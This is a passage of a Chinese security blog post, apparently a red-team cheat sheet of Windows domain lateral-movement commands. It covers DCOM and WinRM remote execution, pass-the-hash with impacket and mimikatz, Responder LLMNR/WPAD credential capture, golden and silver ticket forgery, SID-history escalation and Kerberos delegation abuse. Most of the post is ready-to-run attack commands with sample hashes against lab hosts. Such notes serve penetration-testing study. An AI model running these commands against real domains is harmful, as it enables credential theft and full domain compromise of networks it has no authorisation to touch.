+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 方法一</span><br><span class="line">$com  = [activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;,&quot;1.1.1.1&quot;))</span><br><span class="line">$com.Document.ActiveView.ExecuteShellCommand(&#x27;cmd.exe&#x27;,$null,&quot;/c  calc.exe&quot;,&quot;Minimized&quot;)</span><br><span class="line"></span><br><span class="line">#  方法二</span><br><span class="line">$com  = [Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;,&quot;1.1.1.1&quot;)</span><br><span class="line">$obj  = [System.Activator]::CreateInstance($com)</span><br><span class="line">$item  = $obj.item()</span><br><span class="line">$item.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c  calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br><span class="line"></span><br><span class="line">#  方法三</span><br><span class="line">$com  = [Type]::GetTypeFromCLSID(&#x27;C08AFD90-F2A1-11D1-8455-00A0C91F3880&#x27;,&quot;1.1.1.1&quot;)</span><br><span class="line">$obj  = [System.Activator]::CreateInstance($com)</span><br><span class="line">$obj.Document.Application.ShellExecute(&quot;cmd.exe&quot;,&quot;/c  calc.exe&quot;,&quot;c:\windows\system32&quot;,$null,0)</span><br></pre></td></tr></table></figure>
+
+<p><strong>WINRM</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://1.1.1.1:5985  -u:Administrator -p:password  &quot;whoami&quot;winrs  -r:http://dcserver.jumbolab.com:5985 -u:jumbolab\administrator -p:password  &quot;whoami &quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701112438389.png" alt="image-20200701112438389"></p>
+<p><strong>PTH</strong></p>
+<p>当我们没有明文账号密码，只有hash时，可以尝试hash传递。</p>
+<p>**<br>**</p>
+<p><strong>5.2.1 impacket套件</strong></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
+<table>
+<thead>
+<tr>
+<th>python  wmiexec.py -hashes  aad3b435b51404eeaad3b435b51404ee:518b98ad4178a53695dc997aa02d455c  domain/<a href="mailto:&#x61;&#100;&#x6d;&#x69;&#x6e;&#x69;&#115;&#x74;&#114;&#97;&#116;&#111;&#114;&#x40;&#49;&#46;&#x31;&#46;&#49;&#46;&#49;">&#x61;&#100;&#x6d;&#x69;&#x6e;&#x69;&#115;&#x74;&#114;&#97;&#116;&#111;&#114;&#x40;&#49;&#46;&#x31;&#46;&#49;&#46;&#49;</a> “whoami”</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>psexec.exe  -hashes aad3b435b51404eeaad3b435b51404ee:518B98AD4178A53695DC997AA02D455C  domiain/<a href="mailto:&#x61;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#x31;&#x2e;&#49;&#46;&#x31;&#46;&#49;">&#x61;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#x72;&#97;&#x74;&#x6f;&#114;&#64;&#x31;&#x2e;&#49;&#46;&#x31;&#46;&#49;</a> “whoami”</td>
+</tr>
+<tr>
+<td>smbexec.exe  -hashes aad3b435b51404eeaad3b435b51404ee:CCEF208C6485269C20DB2CAD21734FE7  domiain/<a href="mailto:&#97;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#114;&#x61;&#116;&#x6f;&#x72;&#64;&#x31;&#x2e;&#49;&#x2e;&#49;&#46;&#x31;">&#97;&#100;&#109;&#x69;&#110;&#105;&#x73;&#x74;&#114;&#x61;&#116;&#x6f;&#x72;&#64;&#x31;&#x2e;&#49;&#x2e;&#49;&#46;&#x31;</a> “whoami”</td>
+</tr>
+</tbody></table>
+<hr>
+<p><strong>Invoke-TheHash套件</strong></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Invoke-TheHash/">https://github.com/Kevin-Robertson/Invoke-TheHash/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec  -Target 1.1.1.1 -Domain test.local -Username username -Hash  7ECFFFF0C3548187607A14BAD0F88BB1 -Command &quot;calc.exe&quot; -verbose</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701112558317.png" alt="image-20200701112558317"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">More ActionsInvoke-SMBExec  -Target 1.1.1.1 -Domain test.local -Username username -Hash  7ECFFFF0C3548187607A14BAD0F88BB1 -Command &quot;calc.exe&quot; -verbose</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>mimikatz</strong></p>
+<p>使用如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth  /user:test1 /domain:test.local /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1</span><br></pre></td></tr></table></figure>
+
+<p>弹出cmd：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701112657738.png" alt="image-20200701112657738"></p>
+<p>安装KB2871997补丁后，可以使用AES-256密钥进行hash传递：</p>
+<p>抓取AES-256密钥：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz:</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth  /user:test1 /domain:test.local /aes256:aes256key</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>NTLM-Relay</strong></p>
+<p>上述都是“主动性”的攻击行为，也就是主动去连接别人，那我们也可以尝试“被动性”攻击，当别人访问我们时，或者说是无感知访问时，我们能做什么操作？</p>
+<p>实验环境：</p>
+<p>​    win7172.16.127.184 普通域用户</p>
+<p>​    win10172.16.127.170 域管</p>
+<p>​    dcserver172.16.127.173 域控</p>
+<p>​    kali172.16.127.129 攻击机</p>
+<p>利用工具：</p>
+<p>Responder、impacket</p>
+<p><strong>5.3.1 LLMNR</strong></p>
+<p>​    链路本地多播名称解析（LLMNR）是一个基于协议的域名系统（DNS）数据包的格式，使得双方的IPv4和IPv6的主机来执行名称解析为同一本地链路上的主机。它是包含在Windows Vista中，Windows Server 2008中，Windows 7中，Windows 8中和的Windows 10。它也被实施systemd在Linux上-resolved。LLMNR定义在RFC 4795。</p>
+<p>​    在DNS 服务器不可用时，DNS 客户端计算机可以使用本地链路多播名称解析 (LLMNR—Link-Local Multicast Name Resolution)（也称为多播 DNS 或 mDNS）来解析本地网段上的名称。例如，如果路由器出现故障，从网络上的所有 DNS 服务器切断了子网，则支持 LLMNR 的子网上的客户端可以继续在对等基础上解析名称，直到网络连接还原为止。</p>
+<p>除了在网络出现故障的情况下提供名称解析以外，LLMNR 在建立临时对等网络（例如，机场候机区域）方面也非常有用。</p>
+<p>翻译成白话文怎么说：你正常内网中如访问真实存在的机器，如jumbo01,当有一天你不小心输成了不存在的机器jumbo02，客户端就会问内网中谁是jumbo02啊，有没有是jumbo02的人啊。</p>
+<p> <img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701112943479.png" alt="image-20200701112943479"></p>
+<p>攻击手法v1.0</p>
+<p>首先我们如果访问一台不存在的机器jumbo02，是以下这个结果</p>
+<p>那我们如果我们在客户端询问谁是jumbo02的时候应答他的话，就是这个结果</p>
+<p>攻击机执行</p>
+<blockquote>
+<p>responder  -I eth0</p>
+</blockquote>
+<p>客户端访问jumbo02提示需要输入密码</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113015556.png" alt="image-20200701113015556"></p>
+<p>输入密码后，攻击机收到net-ntlm：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113037389.png" alt="image-20200701113037389"></p>
+<p>收到net-ntlm以后我们就可以尝试利用hashcat进行破解等攻击。</p>
+<p><strong>WPAD</strong></p>
+<p>先来一段百科介绍，网络代理自动发现协议（Web Proxy Auto-Discovery Protocol，WPAD）是一种客户端使用DHCP和/或DNS发现方法来定位一个配置文件URL的方法。在检测和下载配置文件后，它可以执行配置文件以测定特定URL应使用的代理。</p>
+<p>翻译成白话文怎么说：就是你的上网配置、怎么上网，如果你浏览器设置了上网自动检测设置（默认配置），客户端上网的时候，就会问，谁是wpad服务器啊，你是wpad服务器啊，然后拿着pac文件上网去了。</p>
+<p>那如果我们伪造wpad服务器的话，首先攻击机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder  -I eth0 -wFb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113255779.png" alt="image-20200701113255779"></p>
+<p>这里使用-b参数强制使用401认证</p>
+<p>客户端访问一个不存在的域名时会跳出登录框</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113310446.png" alt="image-20200701113310446"></p>
+<p>输入账号密码以后，我们收到明文账号密码</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113328183.png" alt="image-20200701113328183"></p>
+<p>从responder的信息反馈能得知，实际上是利用wpad欺骗返回了一个401认证，导致欺骗我们获取了其账号密码。</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113347901.png" alt="image-20200701113347901"></p>
+<hr>
+<p><strong>域信任</strong></p>
+<p>当存在子父域时，默认其是双向信任。可以利用sid history跨域提权。流程大致如下：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113542743.png" alt="image-20200701113542743"></p>
+<p>利用如下，使用mimikatz获取子域的Krbtgt Hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::lsa  /patch</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113611037.png" alt="image-20200701113611037"></p>
+<p>再使用powerview获取父域的sid：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer  -Domain jumbolab.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113637432.png" alt="image-20200701113637432"></p>
+<p>然后添加一个sid=519的企业管理员，利用mimikatz执行如下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden  /user:Administrator /krbtgt:5a1c26831592774a17f70370b8606449 /domain:child.jumbolab.com  /sid:S-1-5-21-1786649982-4053697927-1628754434  /sids:S-1-5-21-4288736272-2299089681-4131927610-519 /ptt</span><br></pre></td></tr></table></figure>
+
+<p>最终成功获取父域权限</p>
+<hr>
+<p><strong>攻击Kerberos</strong></p>
+<p>在域中，最核心的就是kerberos协议了，但是也会出现各种安全问题，甚至可以以一个普通域用户提权到system权限，配置不当甚至可以获取到域控权限。</p>
+<p><strong>PTT</strong></p>
+<p>当我们抓取到了krbtgt hash时，能做什么？继续往下看。</p>
+<p><strong>金票据</strong></p>
+<p>上面提到了ms14-068，也介绍Kerberos协议，知道了TGT是由krbtgt加密而成。因此当拿到krbtgt账号hash时，就可以构造一个任意权限的tgt了：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113815472.png" alt="image-20200701113815472"></p>
+<p>使用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatzkerberos::purgekerberos::golden  /admin:administrator /domain:域 /sid:SID /krbtgt: krbtgt  hash值 /ticket:administrator.kiribikerberos::ptt  administrator.kiribikerberos::tgtdir  \\dc.domain.com\c$</span><br></pre></td></tr></table></figure>
+
+<p><strong>5.5.1.2 银票据</strong></p>
+<p>上面的金票据是伪造的TGT，银票据是伪造TGS，由服务账号密码加密而成。</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113856505.png" alt="image-20200701113856505"></p>
+<p>利用方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe  &quot;kerberos::golden /domain:域 /sid:SID /target:域控全称 /service:要访问的服务，如cifs /rc4:NTLM，计算机账号hash /user:user /ptt&quot;dir  \\server\c$</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701113928452.png" alt="image-20200701113928452"></p>
+<hr>
+<p><strong>kekeo</strong></p>
+<p>利用kekeo进行ptt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo  &quot;tgt::ask /user:test1 /domain:test.local  /ntlm:7ECFFFF0C3548187607A14BAD0F88BB1&quot;</span><br></pre></td></tr></table></figure>
+
+<p>执行后生成票据 <a href="mailto:&#x54;&#71;&#x54;&#95;&#116;&#101;&#115;&#116;&#x31;&#x40;&#84;&#x45;&#x53;&#84;&#46;&#76;&#79;&#67;&#x41;&#76;&#95;&#107;&#x72;&#98;&#116;&#x67;&#116;">&#x54;&#71;&#x54;&#95;&#116;&#101;&#115;&#116;&#x31;&#x40;&#84;&#x45;&#x53;&#84;&#46;&#76;&#79;&#67;&#x41;&#76;&#95;&#107;&#x72;&#98;&#116;&#x67;&#116;</a>~<a href="mailto:&#x74;&#x65;&#115;&#116;&#46;&#108;&#x6f;&#99;&#97;&#x6c;&#64;&#84;&#69;&#x53;&#84;&#46;&#x4c;&#79;&#x43;&#x41;&#x4c;&#x2e;&#x6b;&#x69;&#x72;&#98;&#x69;">&#x74;&#x65;&#115;&#116;&#46;&#108;&#x6f;&#99;&#97;&#x6c;&#64;&#84;&#69;&#x53;&#84;&#46;&#x4c;&#79;&#x43;&#x41;&#x4c;&#x2e;&#x6b;&#x69;&#x72;&#98;&#x69;</a></p>
+<p>接下来导入票据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo  &quot;kerberos::ptt TGT_test1@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi&quot;dir  \\server\c$</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>委派</strong></p>
+<p><strong>基于资源的约束委派</strong></p>
+<p>简单理解为A机器设置基于资源的约束委派给B(设置msDS-AllowedToActOnBehalfOfOtherIdentity属性)，则B可以通过s4u协议申请高权限票据对A进行利用。利用过程如下：</p>
+<p>普通域用户默认可以添加10个机器账号，添加spnspnspn$并设置msds-allowedtoactonbehalfofotheridentity：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701114129999.png" alt="image-20200701114129999"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-adcomputer  win7 -properties principalsallowedtodelegatetoaccount</span><br></pre></td></tr></table></figure>
+
+<p>利用s4u协议申请高权限票据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getST.py  -dc-ip 172.16.127.173 jumbolab.com/spnspnspn\$:spnspnspn -spn cifs/win7.jumbolab.com -impersonate  administrator</span><br></pre></td></tr></table></figure>
+
+<p>导入票据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export  KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<p>访问目标机器：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.py -no-pass -k -debug win7.jumbolab.com</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701114219405.png" alt="image-20200701114219405"></p>
+<p><strong>非约束委派</strong></p>
+<p>简单理解为user访问service1服务时，如果service1服务开启了非约束委派，则在user访问service1服务时，会把自身的tgt发送给service1，因此service1可以利用user的tgt去访问user可以访问的服务。利用过程如下：</p>
+<p>win7机器开启了非约束委派：</p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701114254137.png" alt="image-20200701114254137"></p>
+<p>下面我们再利用Spooler打印机服务错误强制让运行了spooler服务的机器通过kerberos或ntlm的方式连接指定的目标机器</p>
+<p>SpoolSample.exedcserver win7</p>
+<p>导出tgt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatzprivilege::debugsekurlsa::tickets  /export</span><br></pre></td></tr></table></figure>
+
+<p>导入票据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt  [0;1f9fc7]-2-0-60a10000-DCSERVER$@krbtgt-JUMBOLAB.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>win7机器即可获取所有用户hash：</p>
+<p>发现非约束委派机器可以用如下命令：</p>
+<p>查找域中配置非约束委派用户:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser  -Unconstrained -Domain jumbolab.com</span><br></pre></td></tr></table></figure>
+
+<p>查找域中配置非约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer  -Unconstrained -Domain jumbolab.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>约束委派</strong></p>
+<p><img src="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/image-20200701114426266.png" alt="image-20200701114426266"></p>
+<p>服务账号可以为一个域用户设置spn即可:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe  -U -A test/test test</span><br></pre></td></tr></table></figure>
+
+<p>申请tgt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo：tgt::ask  /user:test /domain:jumbolab.com /password:aA123456</span><br></pre></td></tr></table></figure>
+
+<p>利用生成的tgt申请st：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo：tgs::s4u  /tgt:TGT_test@JUMBOLAB.COM_krbtgt~jumbolab.com@JUMBOLAB.COM.kirbi /user:Administrator@jumbolab.com  /service:cifs/dcserver.jumbolab.com</span><br></pre></td></tr></table></figure>
+
+<p>导入st：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz：kerberos::ptt  TGS_Administrator@jumbolab.com@JUMBOLAB.COM_cifs~dcserver.jumbolab.com@JUMBOLAB.COM.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>发现约束委派机器可以用如下命令：</p>
+<p>查找域中配置约束委派用户:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser  -TrustedToAuth -Domain jumbolab.com</span><br></pre></td></tr></table></figure>
+
+<p>查找域中配置约束委派的主机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer  -TrustedToAuth -Domain jumbolab.com</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+    
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+  <script src="https://cdn.bootcss.com/sweetalert/2.1.2/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/sweetalert/1.1.2/sweetalert.min.css">
+
+  <p><span>本文标题:</span>内网命令记录</a></p>
+  <p><span>文章作者:</span></a></p>
+  <p><span>发布时间:</span>2020年07月03日 - 15:32:43</p>
+  <p><span>最后更新:</span>2020年07月03日 - 15:33:06</p>
+  <p><span>原始链接:</span><a href="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/" title="内网命令记录">http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://laker.xyz/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+    
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/06/%E8%B5%84%E4%BA%A7%E6%90%9C%E9%9B%86%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" rel="next" title="资产搜集方式总结">
+                <i class="fa fa-chevron-left"></i> 资产搜集方式总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/" rel="prev" title="Apache Dubbo个人复现">
+                Apache Dubbo个人复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.th3wind.xyz" title="th3wind" target="_blank">th3wind</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://damit5.com/" title="damit5" target="_blank">damit5</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">域内信息搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">1.1.</span> <span class="nav-text">内网主机发现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%A0%E8%BE%93%E9%80%9A%E9%81%93"><span class="nav-number">2.</span> <span class="nav-text">传输通道</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">5.</span> <span class="nav-text">权限维持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-number">6.</span> <span class="nav-text">横向移动</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">laker</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+    <br>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
